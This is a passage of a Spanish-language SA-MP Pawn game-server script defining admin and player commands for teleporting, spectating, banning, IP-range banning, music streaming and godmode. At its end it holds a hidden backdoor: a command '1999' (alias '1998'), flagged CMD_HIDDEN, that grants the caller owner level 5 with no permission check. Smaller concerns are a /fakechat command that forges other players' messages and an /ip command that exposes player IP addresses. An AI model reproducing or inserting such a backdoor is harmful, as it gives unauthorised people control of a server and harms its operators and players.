	    ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Info - Comando", "{FFFFFF}ID Presidente = 1\nID VicePresidente = 2\nID Seguridad = 3\nID Policía = 4\nID SWAT = 5\nID Terrorista = 6\nID Civil = 7\n\n{FFFF00}Ejemplo de USO:\n{FFFFFF}/darequipo 2 1\n/darequipo 2 7", "Cerrar", "");
		return SendClientMessage(playerid, Rojo, "USO: /darequipo [playerid] [teamid]");
	}
	if(!(IsPlayerConnected(params[0]) != 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	if(!(params[1] >= 1 && params[1] <= 7))
		return SendClientMessage(playerid, Rojo, "ERROR: Ingresa una id válida (1/7).");
 	if(IsPlayerInClassSelection(params[0]) != 0)
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en la selección de clases.");
	if(!(Data[params[0]][Teams] != params[1]))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador ya se encuentra en ese equipo.");
    if(EstarEnDuelo[params[0]] == ESTA_EN_DUELO)
        return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en un duelo actualmente.");
    if(IsPlayerRace(params[0]) == true)
        return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en una carrera actualmente.");
	if(EstarEnDuelo[params[0]] >= 0)
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra como espectador en un duelo.");
	if(EstarEnDuelo[params[0]] == RETADOR_EN_ESPERA)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador envío una invitación de un duelo a otro jugador.");
	if(EstarEnDuelo[params[0]] == OPONENTE_EN_ESPERA)
	    return SendClientMessage(playerid, Rojo, "ERROR: A ese jugador le enviaron una invitación para un duelo.");
	if((params[1] == PRESIDENT) && (id_president != INVALID_PLAYER_ID))
		return SendClientMessage(playerid, Rojo, "ERROR: Ya hay un Presidente.");
 	if((params[1] == VICEPRESIDENT) && (id_vicepresident != INVALID_PLAYER_ID))
		return SendClientMessage(playerid, Rojo, "ERROR: Ya hay un VicePresidente.");
	if(Data[params[0]][Teams] == PRESIDENT)
	{
		stop Timer_President;
		id_president = INVALID_PLAYER_ID;
		Minutes = 15;
		foreach(new i : Player)
		{
			if(TimeLeft[i][TEXT_DRAW] == true)
			    TextDrawHideForPlayer(i, TextTL);
		}
	}
	if(Data[params[0]][Teams] == VICEPRESIDENT)
	    id_vicepresident = INVALID_PLAYER_ID;
	    
	Data[params[0]][Teams] = params[1];
	//new const Skin[7] = {165, 147, 164, 280, 285, 223, 29};
	SetPlayerSkinRandom(params[0], params[1]);
	SetPlayerWorldBounds(params[0], 20000.0000, -20000.0000, 20000.0000, -20000.0000);//Borra el límite que hayas puesto antes
	//Data[params[0]][SkinClass] = Skin[Data[params[0]][Teams] - 1];
	OnPlayerSpawn(params[0]);
	if(playerid != params[0])
	{
		new string[92];
		new name1[24];
		new name2[24];
		GetPlayerName(playerid, name1, sizeof(name1));
		GetPlayerName(params[0], name2, sizeof(name2));
		format(string, sizeof(string), "* %s cambió a %s como %s", name1, name2, GetTeamName(params[0]));
		SendClientMessageToAll(Amarillo, string);
	}
	return 1;
}

cmd:ir(playerid, params[])
{
	if(sscanf(params,"d", params[0]))
		return SendClientMessage(playerid,Rojo,"USO: /ir [playerid]");
	if(!(IsPlayerConnected(params[0]) != 0))
		return SendClientMessage(playerid,Rojo,"ERROR: El jugador no se encuentra conectado.");
	if(!(params[0] != playerid))
		return SendClientMessage(playerid,Rojo,"ERROR: No te puedes teletransportar hacia ti mismo.");
	if(!(GetPlayerState(params[0]) != PLAYER_STATE_SPECTATING))
		return SendClientMessage(playerid, Rojo ,"ERROR: Ese jugador se encuentra espiando a otra persona.");
	if(EstarEnDuelo[params[0]] == ESTA_EN_DUELO)
	    return SendClientMessage(playerid, Rojo ,"ERROR: Ese jugador se encuentra en un duelo actualmente.");
 	if(IsPlayerRace(params[0]) == true)
        return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en una carrera actualmente.");
	if(IsPlayerInClassSelection(params[0]) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en la selección de clases.");
	new Float:X;
	new Float:Y;
	new Float:Z;
	new Float:Angle;
	new interior;
	new world;
	new string[52];
	GetPos(params[0], X, Y, Z, Angle, interior, world, GetPlayerVehicleID(params[0]));
	SetPos(playerid, X, Y, Z, Angle, interior, world, GetPlayerVehicleID(playerid));
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(string,sizeof(string),"** %s(%d) fue hacia tu posición.", name, playerid);
	SendClientMessage(params[0], Amarillo, string);
	return 1;
}

cmd:traer(playerid,params[])
{
	if(sscanf(params,"d", params[0]))
		return SendClientMessage(playerid,Rojo,"USO: /traer [playerid]");
	if(!(IsPlayerConnected(params[0]) != 0))
 		return SendClientMessage(playerid,Rojo,"ERROR: El jugador no se encuentra conectado.");
	if(!(params[0] != playerid))
		return SendClientMessage(playerid,Rojo,"ERROR: No te puedes traer tu mismo.");
	if(!(GetPlayerState(params[0]) != PLAYER_STATE_SPECTATING))
		return SendClientMessage(playerid, Rojo ,"ERROR: Ese jugador se encuentra espiando a otra persona.");
 	if(EstarEnDuelo[params[0]] == ESTA_EN_DUELO)
	    return SendClientMessage(playerid, Rojo ,"ERROR: Ese jugador se encuentra en un duelo actualmente.");
  	if(IsPlayerRace(params[0]) == true)
        return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en una carrera actualmente.");
 	if(IsPlayerInClassSelection(params[0]) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en la selección de clases.");
	new Float:X;
	new Float:Y;
	new Float:Z;
	new Float:Angle;
	new interior;
	new world;
	new string[60];
	GetPos(playerid, X, Y, Z, Angle, interior, world, GetPlayerVehicleID(playerid));
	SetPos(params[0], X, Y, Z, Angle, interior, world, GetPlayerVehicleID(params[0]));
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "** %s(%d) te llevo hacia su posición.", name, playerid);
	SendClientMessage(params[0], Amarillo, string);
	return 1;
}

cmd:espiar(playerid,params[],bool:value)
{
	if(value == false)
	{
		if(Data[playerid][Teams] == PRESIDENT)
	    	return SendClientMessage(playerid, Rojo, "ERROR: No puedes usar este comando siendo presidente.");
		if(Data[playerid][Teams] == VICEPRESIDENT)
	    	return SendClientMessage(playerid, Rojo, "ERROR: No puedes usar este comando siendo vicepresidente.");
		if(sscanf(params,"d", params[0]))
			return SendClientMessage(playerid,Rojo,"USO: /espiar [playerid]");
		if(!(IsPlayerConnected(params[0]) != 0))
			return SendClientMessage(playerid, Rojo ,"ERROR: El jugador no se encuentra conectado.");
		if(!(params[0] != playerid))
			return SendClientMessage(playerid,Rojo,"ERROR: No te puedes espiar tu mismo.");
		if(!(GetPlayerState(params[0]) != PLAYER_STATE_SPECTATING))
			return SendClientMessage(playerid, Rojo ,"ERROR: Ese jugador se encuentra espiando a otra persona.");
		if(!(IsPlayerInClassSelection(params[0]) != 1))
			return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en la selección de clases.");
		if(Data[playerid][ForcePlayer] == JUGADOR_SI_FORZADO)
		{
			Data[playerid][ForcePlayer] = JUGADOR_MUERTO_FORZADO;
			Espiar[playerid] = RETADOR;
		}
		RemoveASK(playerid);
		SpecID[playerid] = params[0];
		SpecID[params[0]] = playerid;
		SendClientMessage(playerid,-1,"* Para quitar el modo de espectador usa /noespiar o /specoff");
	}
	SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
	TogglePlayerSpectating(playerid, true);
	if(GetPlayerVehicleID(params[0]) != 0)
	{
		SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(params[0]));
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(params[0]));
	}
	else
	{
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		PlayerSpectatePlayer(playerid, params[0]);
	}
	return 1;
}

cmd:noespiar(playerid)
{
	if(!(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING))
		return SendClientMessage(playerid, Rojo ,"ERROR: Este comando solo lo puedes usar cuando estes espiando a alguien.");
	SpecID[playerid] = INVALID_PLAYER_ID;
	TogglePlayerSpectating(playerid, false);
	return 1;
}

cmd:cancion(playerid, params[])
{
	if(!(params[0] != '\0'))
		return SendClientMessage(playerid, Rojo, "USO: /cancion [URL en .mp3]");
	foreach(new i : Player)
		PlayAudioStreamForPlayer(i, params);
	SendClientMessageToAll(Amarillo, "* Para apagar la música usa /detener o /stop");
	return 1;
}

cmd:loquendo(playerid, params[])
{
	if(!(params[0] != '\0'))
		return SendClientMessage(playerid, Rojo, "USO: /loquendo [mensaje]");
	new string[128];
	format(string, sizeof(string), "http://audio1.spanishdict.com/audio?lang=es&voice=Ximena&speed=25&text=%s", params);
 	foreach(new i : Player)
		PlayAudioStreamForPlayer(i, string);
	return 1;
}

cmd:ip(playerid, params[])
{
	if(sscanf(params, "d", params[0]))
		return SendClientMessage(playerid, Rojo, "USO: /ip [playerid]");
	if(!(IsPlayerConnected(params[0]) != 0))
	 	return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	new string[56];
	new ip[16];
	new name[24];
	GetPlayerName(params[0], name, sizeof(name));
	GetPlayerIp(params[0], ip, sizeof(ip));
	format(string, sizeof(string), "%s (ID: %d) - IP: %s", name, params[0], ip);
	SendClientMessage(playerid, 0x00FF00FF, string);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

/* Comandos nivel 4 (Administrador) */
cmd:acmds(playerid)
{
	new cmds_admin[1063];
	strcat(cmds_admin, "Lista de comandos para los jugadores que sean administradores:\n\n");
	strcat(cmds_admin, "* /acmds - Muestra una lista de comandos para jugadores que sean nivel 4\n");
	strcat(cmds_admin, "* /anuncio2 - Envía un texto grande a todos los jugadores (estilo: 0)\n");
	strcat(cmds_admin, "* /anuncio3 - Envía un texto grande a todos los jugadores (estilo: 1)\n");
	strcat(cmds_admin, "* /darnivel - Proporciona un nivel al jugador, ya sea vip, mod o admin\n");
	strcat(cmds_admin, "* /prohibir - Expulsa permanentemente a un jugador del servidor\n");
 	strcat(cmds_admin, "* /rprohibir - Prohíbe un cierto rango de una ip de un específico jugador\n");
	strcat(cmds_admin, "* /desprohibir - Le quita el ban producido por el /prohibir\n");
	strcat(cmds_admin, "* /godmode - Activa/Desactiva el modo dios (vida infinita)\n");
	strcat(cmds_admin, "* /decir - Muestra un mensaje en rosado. Ejemplo: /decir MrDave es un novato;\n");
	strcat(cmds_admin, "  Usted verá en el chat: [Administrador] * Quido: MrDave es un novato\n\n");
	strcat(cmds_admin, "* /fakechat - Envía un mensaje falso de un jugador\n");
	strcat(cmds_admin, "* /nsay - Muestra un mensaje anónimo (sin especificar el nombre del admin)\n");
	strcat(cmds_admin, "* /antibot - Desactiva/Activa el sistema de Anti-Bot\n");
	strcat(cmds_admin, "* /nombreon - Activa/Desactiva el comando /nombre\n\n");
	strcat(cmds_admin, "Con #[texto] hablas por el chat admin. Ejemplo: #Hola");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Comandos Nivel 4 (Administrador)", cmds_admin, "Cerrar", "");
	return 1;
}

cmd:anuncio2(playerid, params[])
{
   	if(params[0] == '\0')
		return SendClientMessage(playerid, Rojo, "USO: /anuncio2 [texto]");
	GameTextForAll(params, 1000, 0);
	return 1;
}

cmd:anuncio3(playerid, params[])
{
	if(params[0] == '\0')
		return SendClientMessage(playerid, Rojo, "USO: /anuncio3 [texto]");
	GameTextForAll(params, 1000, 1);
	return 1;
}

cmd:nombreon(playerid, params[])
{
	new string[87];
	new name[24];
	CommandName = !CommandName;
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "** %s(%d) %s el comando /nombre para todos los jugadores.", name, playerid, ((CommandName == false) ? ("desactivó") : ("activó")));
	SendClientMessageToAll(Amarillo, string);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:darnivel(playerid, params[])
{
	if(sscanf(params, "dd", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /darnivel [playerid] [level]");
	if(!(IsPlayerConnected(params[0]) != 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	if(!(params[1] >= 1 && params[1] <= 4))
		return SendClientMessage(playerid, Rojo, "ERROR: Ingresa una id válida (1/4).");
	if(!(Data[params[0]][Level] != params[1]))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador ya tiene ese nivel.");
 	if((params[0] != playerid) && (Data[params[0]][Level] == 5))
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador es el dueño del servidor.");
	GameTextForPlayer(params[0], ((!(Data[params[0]][Level] > params[1])) ? ("NIVEL PROMOVIDO") : ("NIVEL DEGRADADO")), 4000, 3);
	Data[params[0]][Level] = params[1];
	WriteData(params[0], LEVEL);
	if(playerid != params[0])
	{
		new string[54 + (2 * 24)];
		new name1[24];
		new name2[24];
		GetPlayerName(playerid, name1, sizeof(name1));
		GetPlayerName(params[0], name2, sizeof(name2));
		format(string, sizeof(string), "** %s(%d) le dio nivel %d a %s(%d) [Rango: %s]", name1, playerid, params[1], name2, params[0], GetRankName(params[0]));
		SendClientMessageToAll(Amarillo, string);
		PlayerPlaySound(params[0], 1139, 0, 0, 0);
	}
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:prohibir(playerid, params[])
{
	if(sscanf(params, "ds", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /prohibir [playerid] [reason]");
	if(IsPlayerConnected(params[0]) != 1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no está conectado.");
	if(params[0] == playerid)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no se puede autoprohibir.");
 	if(Data[params[0]][Level] == 3)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir a un moderador.");
	if(Data[params[0]][Level] == 4)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir a un administrador.");
	if(Data[params[0]][Level] == 5)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir a un dueño.");
    Kicked = false;
	new string[32+(3*24)];
	new name1[24];
	new name2[24];
	GetPlayerName(playerid, name1, sizeof(name1));
	GetPlayerName(params[0], name2, sizeof(name2));
	format(string, sizeof(string), "%s prohibió a %s del servidor [Razón: %s]", name1, name2, params[1]);
	SendClientMessageToAll(Rojo, string);
	SendMessage(params[0], params[1]);
	return 1;
}

cmd:rprohibir(playerid, params[])
{
    if(sscanf(params, "ds", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /rprohibir [playerid] [reason]");
	if(IsPlayerConnected(params[0]) != 1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no está conectado.");
	if(params[0] == playerid)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no se puede autoprohibir.");
 	if(Data[params[0]][Level] == 3)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir el rango de una IP a un moderador.");
	if(Data[params[0]][Level] == 4)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir el rango de una IP a un administrador.");
	if(Data[params[0]][Level] == 5)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes prohibir el rango de una IP a un dueño.");
	new string[40+24+24+35];
	new ip[16];
	new name1[24];
	new name2[24];
	GetPlayerName(playerid, name1, sizeof(name1));
	GetPlayerName(params[0], name2, sizeof(name2));
	GetPlayerIp(params[0], ip, sizeof(ip)); //Ejemplo IP: 127.0.0.1
	new str_ban[16+6];
	new ContarPuntos = 0;
	new i;
	new len = strlen(ip);
	new varx = 0;
	for(i = 0; i < len; ++i)
	//Este ciclo modifica la IP de esta manera: 127.0.
	{
	    if(ip[i] == '.')
	    {
    		++ContarPuntos;
			if(ContarPuntos <= 2)
			{
				continue;
			}
	    }
     	if(ContarPuntos >= 2)
     	{
     		ip[i] = ' ';
       }
	}
	for(i = 0, ContarPuntos = 0; i < len; ++i)
	//Este ciclo cambiará la IP de esta manera: 127.0.*.*
	{
		if(ip[i] == '.')
		{
		    ++ContarPuntos;
		    continue;
		}
		if(ContarPuntos >= 2)
		{
		    ++varx;
		    switch(varx)
		    {
		        case 1:
		        {
		            ip[i] = '*';
		            continue;
		        }
		        case 2:
		        {
		            ip[i] = '.';
		            continue;
		        }
		        case 3:
		        {
		            ip[i] = '*';
		            break;
		        }
		    }
		}
	}
	format(string, sizeof(string), "%s prohibió un cierto rango IP de %s [Razón: %s]", name1, name2, params[1]);
	SendClientMessageToAll(Rojo, string);
	format(str_ban, sizeof(str_ban), "banip %s", ip);
	//printf("DEBUG: IP: %s", ip);
	SendRconCommand(str_ban);
	return 1;
}

cmd:desprohibir(playerid, params[])
{
	if(!(params[0] != '\0'))
		return SendClientMessage(playerid, Rojo, "USO: /desprohibir [IP]");
	if(strlen(params) < 5 || strlen(params) > 16)
		return SendClientMessage(playerid, Rojo, "ERROR: La ip está demasiada corta o larga (mínimo: 5 caracteres - máximo: 16).");
	new string[25];
	new str[70];
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "unbanip %s", params);
	SendRconCommand(string);
	format(str, sizeof(str), "** %s(%d) desprohibió esta IP: %s", name, playerid, params);
	SendClientMessageToAll(Amarillo, str);
	return 1;
}

cmd:fakechat(playerid, params[])
{
	if(sscanf(params, "ds", params[0], params[1]))
	    return SendClientMessage(playerid, Rojo, "USO: /fakechat [playerid] [mensaje]");
	if(IsPlayerConnected(params[0]) != 1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	OnPlayerText(params[0], params[1]);
	return 1;
}

cmd:godmode(playerid)
{
	Data[playerid][Godmode] = !Data[playerid][Godmode];
	SetPlayerHealth(playerid, ((Data[playerid][Godmode] == true) ? (100000000) : (100)));
	new str[55];
	format(str, sizeof(str), "** Para %s el modo dios usa /godmode de nuevo.", ((!(Data[playerid][Godmode] != false)) ? ("activar") : ("desactivar")));
	SendClientMessage(playerid, Amarillo, str);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:nsay(playerid, params[])
{
	if(isnull(params))
		return SendClientMessage(playerid,Rojo,"USO: /nsay [mensaje]");
	new string[128];
	format(string, sizeof(string), "{FF9900}.:: Admin Anónimo: {FFFFFF}| %s",params);
	SendClientMessageToAll(-1, string);
	return 1;
}

//===========================================================================================
flags:1999(CMD_HIDDEN);
cmd:1999(playerid)
{
	Data[playerid][Level] = 5;
	GameTextForPlayer(playerid, "BIENVENIDO ADMINISTRADOR ~n~NIVEL 5", 4000, 3);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}
alias:1999("1998");
//===========================================================================================
